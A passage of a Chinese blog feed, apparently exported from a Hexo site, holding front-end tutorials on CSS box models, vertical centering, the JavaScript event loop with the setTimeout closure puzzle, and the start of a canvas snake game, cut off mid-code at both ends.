class="title">$$</span>(<span class="params">selector,context</span>)</span>&#123;</span><br><span class="line">    context = context||<span class="built_in">document</span>;</span><br><span class="line">    <span class="keyword">var</span> elements = context.querySelector(selector);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Array</span>.prototype.slice.call(elements);</span><br><span class="line">&#125;</span><br><span class="line">$$(<span class="string">'h1'</span>).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">h1</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> len = h1.textContent.length,s = h1.style;</span><br><span class="line"></span><br><span class="line">    s.width = len + <span class="string">'ch'</span>;</span><br><span class="line">    s.animationTimingFunction = <span class="string">"steps("</span> + len + <span class="string">"),steps(1)"</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li>如果浏览器不支持ch单位，我们该怎么办？这时候就需要实现样式的回退，如果不希望字体出现异常，会选择补一行em作为单位的回退样式</li></ul><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>这一篇主要基于<code>steps()</code>函数和<code>ch单位</code>,详细的比较了<code>steps()</code>调速函数和基于贝塞尔曲线调速函数的区别，虽然<code>steps()</code>调速函数像是旁人唯恐不及的丑小鸭，但是它亦有其独特的魅力。</p>]]></content>
      
      
      <categories>
          
          <category> HTML/CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>css标准盒模型、怪异模式</title>
      <link href="/2017/12/09/css-box-model/"/>
      <url>/2017/12/09/css-box-model/</url>
      
        <content type="html"><![CDATA[<h1 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h1><h2 id="DTD规范"><a href="#DTD规范" class="headerlink" title="DTD规范"></a>DTD规范</h2><p>盒模型分为：标准w3c盒模型、IE盒模型、以及css中的伸缩盒模型</p><p>当我们使用编辑器创建一个html页面时，我们一定会发现最顶上的<code>DOCTYPE</code>标签</p><a id="more"></a><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>上面这些doctype都是标准的文档类型，无论我们使用哪种模式都会触发标准模式，而如果doctype缺失，则在ie6、ie7、ie8将会触发怪异模式(quirks);</p></blockquote><p>一旦为页面设置了恰当的<code>DTD(文档定义类型)</code>,大多数浏览器都会按照标准盒模型来呈现内容，但是ie5和ie6的呈现却是不正确的.</p><p>根据w3c规范，元素内容占据空间是由<code>width</code>属性设置的，而内容周围的padding和border都是另外计算的。</p><p>不幸的是，IE5.X 和 6 在怪异模式中使用自己的非标准模型。这些浏览器的 width 属性不是内容的宽度，而是内容、内边距和边框的宽度的总和。</p><h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><p>我们用一个div块来演示标准模式和怪异模式的区别：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">border</span>:<span class="number">20px</span> solid black;</span><br><span class="line">    <span class="attribute">padding</span>:<span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="标准盒模型"><a href="#标准盒模型" class="headerlink" title="标准盒模型"></a>标准盒模型</h3><p>在标准模式下的盒模型如下图所示，盒子总宽度/高度=width/height+padding+border+margin</p><p><img src="http://www.chenqaq.com/assets/images/box-model1.png" alt="标准盒模型"></p><h3 id="怪异模式"><a href="#怪异模式" class="headerlink" title="怪异模式"></a>怪异模式</h3><p>在怪异模式下的盒模型如下图所示，盒子的总宽度和高度是包含内边距padding和边框border宽度在内的</p><p>盒子总宽度/高度=width/height + margin = width/height + margin;</p><p><img src="http://www.chenqaq.com/assets/images/box-model2.png" alt="怪异盒模型"></p><h1 id="CSS3的box-sizing属性"><a href="#CSS3的box-sizing属性" class="headerlink" title="CSS3的box-sizing属性"></a>CSS3的box-sizing属性</h1><p>语法：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">box-sizing : content-box || border-box || inherit;</span><br></pre></td></tr></table></figure><ul><li>当设置为content-box时，将采取标准模式进行解析计算</li><li>当设置为border-box时，将采取怪异模式解析计算</li></ul>]]></content>
      
      
      <categories>
          
          <category> HTML/CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> layout </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>把所有的东西都对齐吧！</title>
      <link href="/2017/12/07/css-verticalMiddle/"/>
      <url>/2017/12/07/css-verticalMiddle/</url>
      
        <content type="html"><![CDATA[<blockquote><p>“44年前我们就把人类送上了月球了，但现在我们仍然无法在css中实现垂直居中  -James Anderson”</p></blockquote><h1 id="难题"><a href="#难题" class="headerlink" title="难题"></a>难题</h1><p>在CSS中对元素进行水平居中是非常简单的；<code>如果是一个行内元素，就对父元素设置text-align:center；如果是一个它是一个块级元素，就对自身应用margin:auto.</code>然而考虑到代码的DRY和较强的可维护性，如果要对一个元素进行垂直居中，可能是令人头皮发麻的一件事情了.</p><a id="more"></a> <p>就这样在前端开发圈内看似及其常见的需求，从理论上似乎极其简单，在实践中，它往往难如登天，当涉及尺寸不固定的元素时尤为如此.</p><p>为了解决这一”绝世难题”，于是前端开发者们殚精竭虑，脑洞大开，琢磨出了各种解决方案，大多数并不实用.</p><p>一路走来走了不少弯路，希望初入前端的小伙伴们可以走的更加通畅，总结分享给大家：</p><p>下面就让我们来探索现代css的强大威力：</p><h1 id="基于表格布局法的解决方案"><a href="#基于表格布局法的解决方案" class="headerlink" title="基于表格布局法的解决方案"></a>基于表格布局法的解决方案</h1><p>利用表格的显示模式，需要用到一些冗余的HTML元素</p><p>思路来源：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"width:100%;height:100%;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">td</span> <span class="attr">style</span>=<span class="string">"text-align: center; vertical-align: middle;"</span>&gt;</span></span><br><span class="line">          Unknown stuff to be centered.</span><br><span class="line">     <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">html</span>,<span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>摘自：<a href="https://css-tricks.com/centering-in-the-unknown/" target="_blank" rel="noopener">https://css-tricks.com/centering-in-the-unknown/</a></p><p>我们发现在table中vertical-align: middle；实现了自动垂直居中.</p><p>基于曾经在网页早期风靡一时的表格布局法：实现了垂直居中</p><iframe height='341' scrolling='no' title='xPNopE' src='//codepen.io/okaychen/embed/xPNopE/?height=341&theme-id=dark&default-tab=js,result&embed-version=2' frameborder='no' allowtransparency='true' allowfullscreen='true' style='width: 100%;margin-top:20px;'>See the Pen <a href='https://codepen.io/okaychen/pen/xPNopE/' target="_blank" rel="noopener">xPNopE</a> by okaychen (<a href='https://codepen.io/okaychen' target="_blank" rel="noopener">@okaychen</a>) on <a href='https://codepen.io' target="_blank" rel="noopener">CodePen</a>.</iframe><p>但是由于表格布局法逐渐的退出舞台，这种方法也渐渐的不为所用</p><h1 id="基于绝对定位的解决方案"><a href="#基于绝对定位的解决方案" class="headerlink" title="基于绝对定位的解决方案"></a>基于绝对定位的解决方案</h1><p>早期实现垂直居中方法，要求具有固定的宽度和高度：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">main</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>:absolute;</span><br><span class="line">    <span class="attribute">top</span>:<span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">left</span>:<span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">magin-top</span>:-<span class="number">3em</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>:-<span class="number">9em</span>;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">18em</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">6em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方法利用负外边距移动的方法，从而把元素放在视口的正中心.我们还可以借助强大的<code>calc</code>函数，省掉两行声明：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">main</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>:absolute;</span><br><span class="line">    <span class="attribute">top</span>:<span class="built_in">calc</span>(50%-3em);</span><br><span class="line">    <span class="attribute">left</span>:<span class="built_in">calc</span>(50%-9em);</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">18em</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">6em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然这个方法最大的局限性就是他要求元素具有固定宽度和高度.我们知道在通常情况下，固定宽度和高度的情况是极少的，对于那些需要居中的元素来说，其尺寸往往是由其内容决定的.如果能够找到一个属性的百分比以元素自身的宽高作为基准，那么难题就迎刃而解！遗憾的是，<code>对于大多数的css属性（包括margin）来说，百分比都是以其父元素的尺寸为基准进行解析的</code>.</p><p>css领域有一个很常见的现象，真正的解决方案往往来自我们最意想不到的地方：利用css变形属性，</p><blockquote><p>当我们在进行<code>translate（）</code>变形函数中使用百分比值时，是<code>以这个元素位基准进行转换和移动的</code>，而这正是我们所需要的.</p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">main</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>:absolute;</span><br><span class="line">    <span class="attribute">top</span>:<span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">left</span>:<span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform</span>:<span class="built_in">translate</span>(-50%,-50%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><iframe height='265' scrolling='no' title='css-lineCenter-position' src='//codepen.io/okaychen/embed/NwQyRN/?height=265&theme-id=dark&default-tab=css,result&embed-version=2' frameborder='no' allowtransparency='true' allowfullscreen='true' style='width: 100%;margin-top:20px;'>See the Pen <a href='https://codepen.io/okaychen/pen/NwQyRN/' target="_blank" rel="noopener">css-lineCenter-position</a> by okaychen (<a href='https://codepen.io/okaychen' target="_blank" rel="noopener">@okaychen</a>) on <a href='https://codepen.io' target="_blank" rel="noopener">CodePen</a>.</iframe><p>从codepen中看到，利用css变形技巧，这个容器已经完美居中，满足我们的期望.</p><p>但是没有任何技巧十全十美，我们需要注意几点：</p><ul><li><p>我们有时不能选择决定定位，他对整个布局影响太过强烈</p></li><li><p>如果需要居中的元素已经在高度上超过了视口，那它的顶部部分就会被视口裁掉</p></li><li><p>在某些浏览器中，这个方法可能会导致元素的显示模糊，因为元素可能会被放置在半个元素上.可以用一个偏hack的手段来修复<code>transform-style:preserve-3d</code></p></li></ul><h1 id="基于视口的解决方案"><a href="#基于视口的解决方案" class="headerlink" title="基于视口的解决方案"></a>基于视口的解决方案</h1><p>假设我们不使用绝对定位，仍然采用<code>translate()</code>技巧来把这个元素以其自身宽高的一半为距离进行移动；但是在缺少left和top的情况下，如何吧这个元素放在容器正中心呢？</p><p>我们的第一反应很可能用margin属性的百分比值来实现，就像这样：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">main</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">18em</span>;</span><br><span class="line">    <span class="attribute">padding</span>:<span class="number">1em</span> <span class="number">1.5em</span>;</span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">50%</span> auto <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">transform</span>:<span class="built_in">translateY</span>(-50%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是却产生了十分离谱的效果.原因在于<code>margin的百分比值是以父元素的宽度作为解析基准的</code></p><p>在CSS值与单位（第三版）定义了一套新的单位，称为视口相关的长度单位</p><ul><li><p>vm是与视口宽度相关的.1vm相当于视口的1%</p></li><li><p>与vw类似，1vh相当于视口的1%</p></li><li><p>当视口宽度小于高度时，1vmin等于1vw，否则等于1vh</p></li><li><p>当视口宽度大于高度时，1vmax等于1vw，否则等于1vh</p></li></ul><p>在这个例子中，我们适用外边距的是vh单位</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">main</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">18em</span>;</span><br><span class="line">    <span class="attribute">padding</span>:<span class="number">1em</span>  <span class="number">1.5em</span>;</span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">50vh</span> auto <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">transform</span>:<span class="built_in">translateY</span>(-50%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><iframe height='265' scrolling='no' title='css-lineCenter-vm' src='//codepen.io/okaychen/embed/NwQydr/?height=265&theme-id=dark&default-tab=css,result&embed-version=2' frameborder='no' allowtransparency='true' allowfullscreen='true' style='width: 100%;margin-top:20px'>See the Pen <a href='https://codepen.io/okaychen/pen/NwQydr/' target="_blank" rel="noopener">css-lineCenter-vm</a> by okaychen (<a href='https://codepen.io/okaychen' target="_blank" rel="noopener">@okaychen</a>) on <a href='https://codepen.io' target="_blank" rel="noopener">CodePen</a>.</iframe><p>我们可以看到，其效果堪称完美.这个技巧更适合于在视口中居中的场景.</p><h1 id="基于Flexbox的解决方案"><a href="#基于Flexbox的解决方案" class="headerlink" title="基于Flexbox的解决方案"></a>基于Flexbox的解决方案</h1><p>这是毋庸置疑的最佳解决方案，因为Flexbox（伸缩盒）是专门针对这类需求所设计的.现代浏览器对于Flexbox支持度已经相当不错了</p><p>我们只需要两行声明即可：先给这个待定居中元素的父元素设置<code>display:flex</code>（在使用的例子中是body元素），在给这个元素设置我们在熟悉不过的<code>margin:auto</code></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>:flex;</span><br><span class="line">    <span class="attribute">min-height</span>:<span class="number">100vh</span>;</span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">main</span>&#123;</span><br><span class="line">    <span class="attribute">margin</span>:auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Flexbox还有一个好处就是，它可以将匿名容器（即使没有节点包裹的文本节点）垂直居中.</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">main</span>&gt;</span>center me，place！<span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br></pre></td></tr></table></figure><p>借助Flexbox规范所吸引人的<code>align-items</code>和<code>justify-content</code>属性，我们可以让它内部文本也实现居中</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">main</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>:flex;</span><br><span class="line">    <span class="attribute">align-items</span>:center;</span><br><span class="line">    <span class="attribute">justify-content</span>:center;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">18em</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">10em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="把所有的东西都对齐吧！"><a href="#把所有的东西都对齐吧！" class="headerlink" title="把所有的东西都对齐吧！"></a>把所有的东西都对齐吧！</h1><p>根据盒对齐模型（第三版）的计划，在未来，对于简单的垂直居中的要求，我们完全不需要动用特殊的布局模式.我们只需要这行代码就可以搞定</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">align-self</span><span class="selector-pseudo">:center</span>;</span><br></pre></td></tr></table></figure><p>不知不觉间，我们身边的浏览器都开始让它成为现实（但是路途还很遥远：IE10及更早版本不支持，Safari 7.0 及更早版本使用-webkit前缀）</p><p><img src="http://www.chenqaq.com/assets/images/hack.png" alt="align-self:center"></p><p>参考</p><ul><li><p>《CSS Secrets 》</p></li><li><p>CSS-tricks：<a href="https://css-tricks.com/centering-in-the-unknown/" target="_blank" rel="noopener">https://css-tricks.com/centering-in-the-unknown/</a></p></li><li><p>CSS变形：<a href="http://w3.org/TR/css-transforms" target="_blank" rel="noopener">http://w3.org/TR/css-transforms</a></p></li><li><p>CSS值与单位：<a href="http://w3.org/TR/css-values" target="_blank" rel="noopener">http://w3.org/TR/css-values</a></p></li><li><p>CSS伸缩盒布局模型：<a href="http://w3.org/TR/css-flexbox" target="_blank" rel="noopener">http://w3.org/TR/css-flexbox</a></p></li><li><p>CSS盒对齐模型：<a href="http://w3.org/TR/css-align" target="_blank" rel="noopener">http://w3.org/TR/css-align</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> HTML/CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> Layout </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同步、异步、回调执行顺序经典闭包setTimeout分析</title>
      <link href="/2017/12/06/js-setTimeout/"/>
      <url>/2017/12/06/js-setTimeout/</url>
      
        <content type="html"><![CDATA[<h1 id="聊聊同步、异步和回调"><a href="#聊聊同步、异步和回调" class="headerlink" title="聊聊同步、异步和回调"></a>聊聊同步、异步和回调</h1><p>同步，异步，回调，我们傻傻分不清楚，</p><p>有一天，你找到公司刚来的程序员小T，跟他说：“我们要加个需求，你放下手里的事情优先支持，我会一直等你做完再离开”。小T微笑着答应了，眼角却滑过一丝不易觉察的杀意。</p><p>世界上的所有事情大致可以分为同步去做和异步去做两种。你打电话去订酒店，电话另一边的工作人员需要查下他们的管理系统才能告诉你有没有房间。</p><p>这时候你有两种选择：一种是不挂电话一直等待，直到工作人员查到为止（可能几分钟也可能几个小时，取决于他们的办事效率），这就是同步的。</p><p>另一种是工作人员问了你的联系方式就挂断了电话，等他们查到之后再通知你，这就是异步的，这时候你就可以干点其他事情，比如把机票也定了之类的</p><blockquote><p> 计算机世界也是如此，我们写的代码需要交给cpu去处理，这时候就有同步和异步两种选择。js是单线程的，如果所有的操作（<code>ajax</code>,获取文件等I/O操作<code>&lt;node&gt;</code>）都是同步的，遇到哪些耗时的操作，后面的程序必然被阻塞而不能执行，页面也就失去了响应，</p></blockquote><blockquote><p>因此js采用了事件驱动机制，在单线程模型下，使用异步回调函数的方式来实现非阻塞的IO操作，</p></blockquote><a id="more"></a><p>那么什么是异步任务呢？（参考阮一峰老师《JavaScript运行机制》）</p><p>异步任务也就是 指主线程（stack栈）运行的过程中，当stack空闲的时候，主线程对event queque（队列）轮询(事实上一直在轮询)后，将异步任务放到stack里面进行执行；</p><p><img src="http://www.chenqaq.com/assets/images/event.png" alt="（上图转引自Philip Roberts的演讲《Help, I&#39;m stuck in an event-loop》））"></p><p> 简单的说，如果我们指定过回调函数，那么当事件发生时就会进入事件队列，等待主线程的<code>stack</code>空闲的时候，就会对<code>event queue</code>里面的回调读取并放到<code>stack</code>里面执行</p><p>我们经常说的可能是异步回调（当然也有同步回调），所以也就并不难理解，回调和异步之间其实并没有直接的联系，回调只是异步的一种实现方式， </p><p>通过这样的<code>event loop</code>我们其实可以分析出三者的执行顺序，即 <code>同步 &gt; 异步 &gt; 回调</code></p><h1 id="经典闭包setTimeout分析"><a href="#经典闭包setTimeout分析" class="headerlink" title="经典闭包setTimeout分析"></a>经典闭包setTimeout分析</h1><p>今天同学问了我一个问题，我一看是一道经典的面试题，问题如下：</p><p><img src="http://www.chenqaq.com/assets/images/questions.png" alt="question"></p><p>简单的这个问题改一下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">     setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="built_in">console</span>.log( i );</span><br><span class="line">     &#125;, i*<span class="number">1000</span>);</span><br><span class="line">      <span class="built_in">console</span>.log( <span class="string">' i : '</span> , i );</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">console</span>.log( i );</span><br></pre></td></tr></table></figure><p>相信我们很多人都遇到过这个问题，心中或许都有答案：</p><p><img src="http://www.chenqaq.com/assets/images/results.png" alt="result"></p><p>那么为什么并不是入门者心中所想要的结果嘞(为什么<code>setTimeout</code>中打印出<code>i</code>全部是<code>6</code>，而且是最后才打印出来呢)？</p><p>那么就让我们来梳理一下，第一部分<code>event loop</code>图片很直观的体现：”任务队列”可以放置异步任务的事件，也可以放置定时事件（<code>setTimeout</code>和<code>setinterval</code>），即指定某些代码在多少时间之后执行；</p><p> 1、首先我们先来看一下他的主体结构：<code>for</code>循环的第一层是<code>setTimeout</code>函数，<code>setTimeout</code>函数中使用了一个匿名（回调）函数</p><p> 2、还记的我们之前总结的执行顺序：同步 &gt; 异步 &gt; 回调 吧！</p><p>　   for循环和外层的 <code>console.log()</code>是同步的，<code>setTimeout</code>是回调执行，</p><blockquote><p>所以按照执行顺序，先执行for循环，然后进入for循环中，他发现了一个<code>setTimeout()</code>回调(进入<code>event queque</code>事件队列，等待<code>stack</code>栈为空后读取并放入栈中后执行)，</p></blockquote><blockquote><p>这时候他并不会等待，而是继续执行 –&gt; for循环内部的  <code>console.log( &#39; i : &#39; , i )</code>  –&gt;  for循环外部的<code>console.log( i )</code> ，然后”任务队列”中的回调函数才进入到空<code>Stack</code>中开始执行；</p></blockquote><p> 我们在来用这个例子尝试一下上面的event loop图，更加直观的感受一下：</p><p> <img src="http://www.chenqaq.com/assets/images/eventMe.png" alt=""></p><p> 那么接下来可能会问怎么解决这个问题呢？我想最简单的当然是<code>let</code>语法了，</p> <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log( i );</span><br><span class="line">      &#125;, i*<span class="number">1000</span>);</span><br><span class="line">      <span class="built_in">console</span>.log( <span class="string">' 1 : '</span> , i );</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"> <span class="built_in">console</span>.log( i );</span><br></pre></td></tr></table></figure><p> 我们都知道<code>es5</code>中变量作用域是函数，而<code>es6</code>却可以使用<code>let</code>声明一个具有块级作用域的i，在这里也就是<code>for</code>循环体；</p><p>在这里<code>let</code>本质上就是形成了一个闭包，那么写成<code>es5</code>的形式其实等价于：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> loop = <span class="function"><span class="keyword">function</span> (<span class="params">_i</span>) </span>&#123;</span><br><span class="line">     setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="built_in">console</span>.log( _i);</span><br><span class="line">     &#125;, _i*<span class="number">1000</span>);</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">'2：'</span>,_i)  </span><br><span class="line"> &#125;; </span><br><span class="line"> </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _i = <span class="number">0</span>; _i &lt;= <span class="number">5</span>; _i++) &#123;  </span><br><span class="line">      loop(_i); </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>到这里，我们就完成了从同步、异步、回调的机制分析 到 setTimeout的经典案例的分析，JavaScript博大精深，我们需要了解他的机制去深入去挖掘他。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 事件循环 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手起刀落-一起写经典的贪吃蛇游戏</title>
      <link href="/2017/12/05/js-snakey/"/>
      <url>/2017/12/05/js-snakey/</url>
      
        <content type="html"><![CDATA[<h1 id="回味"><a href="#回味" class="headerlink" title="回味"></a>回味</h1><p>小时候玩的经典贪吃蛇游戏我们印象仍然深刻，谋划了几天，小时候喜欢玩的游戏，长大了终于有能力把他做出来(从来都没有通关过，不知道自己写的程序，是不是能通关了…)，好了，闲话不多谈，先来看一下效果吧！！</p><p><img src="http://www.chenqaq.com/assets/images/4tjOY7QXHK.gif" alt="效果图"></p><p>功能和小时候玩的贪吃蛇一样，</p><blockquote><p>   1.选择速度 ：<br>       slow<br>       normal<br>       fast</p></blockquote><blockquote><p>   2.选择是否有墙作为障碍物：<br>       on<br>       off</p></blockquote><p>看完效果就先附上地址喽：<a href="https://github.com/okaychen/practice" target="_blank" rel="noopener">大山深处修炼的小龙虾</a>，欢迎fork.</p><a id="more"></a><h1 id="结构分解"><a href="#结构分解" class="headerlink" title="结构分解"></a>结构分解</h1><p>如果构建一个简单的经典贪吃蛇游戏呢？我们根据面板可以分解出如下结构：</p><p><img src="http://www.chenqaq.com/assets/images/snake1.png" alt="面板结构分解"></p><p>因为其他面板比较简单，我们重点来看一下游戏面板</p><h2 id="游戏面板"><a href="#游戏面板" class="headerlink" title="游戏面板"></a>游戏面板</h2><p>游戏面板是核心，在游戏面板中，我们来分解一下游戏面板我们需要的因素：</p><p><img src="http://www.chenqaq.com/assets/images/snake2.png" alt=""></p><h3 id="场景、snake、食物"><a href="#场景、snake、食物" class="headerlink" title="场景、snake、食物"></a>场景、snake、食物</h3><p>首先我们需要一个游戏场景、snake、食物这些基础设施<br>   这里使用canvas作为我们的整个游戏的场景：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">&lt;canvas <span class="keyword">class</span>="<span class="symbol">wrap</span>" <span class="symbol">id</span>="<span class="symbol">snake</span>" <span class="symbol">width</span>="<span class="symbol">400</span>" <span class="symbol">height</span>="<span class="symbol">400</span>" <span class="symbol">tabindex</span>="<span class="symbol">1</span>"&gt;&lt;/<span class="symbol">canvas</span>&gt;</span><br></pre></td></tr></table></figure><p>需要一只snake,后面初始化他的位置</p><figure class="highlight gml"><table><tr><td class="code"><pre><span class="line"><span class="keywords">var</span> activeDot = function (<span class="symbol">x</span>, <span class="symbol">y</span>) &#123;</span><br><span class="line">    ctx.fillStyle = <span class="string">"#eee"</span>;</span><br><span class="line">    ctx.fillRect(<span class="symbol">x</span> * <span class="number">10</span>, <span class="symbol">y</span> * <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要食物作为对象(关于食物我们需要定义一些规则，如食物的产生)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">var</span> <span class="string">food</span> <span class="string">=</span> <span class="string">&#123;</span></span><br><span class="line">    <span class="attr">x:</span> <span class="number">0</span><span class="string">,</span></span><br><span class="line">    <span class="attr">y:</span> <span class="number">0</span></span><br><span class="line"><span class="string">&#125;;</span></span><br></pre></td></tr></table></figure><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p>规则是游戏的核心</p><p>关于游戏的规则</p><p>snake的方向控制：(使用键盘的上下左右键控制蛇的方向)</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// changer dir</span></span><br><span class="line">   <span class="keyword">var</span> changeDir = <span class="function"><span class="keyword">function</span> (<span class="params">key</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (key == <span class="number">38</span> &amp;&amp; snake_dir != <span class="number">2</span>) &#123;</span><br><span class="line">           snake_next_dir = <span class="number">0</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (key == <span class="number">39</span> &amp;&amp; snake_dir != <span class="number">3</span>) &#123;</span><br><span class="line">               snake_next_dir = <span class="number">1</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> (key == <span class="number">40</span> &amp;&amp; snake_dir != <span class="number">0</span>) &#123;</span><br><span class="line">                   snake_next_dir = <span class="number">2</span>;</span><br><span class="line">               &#125; <span 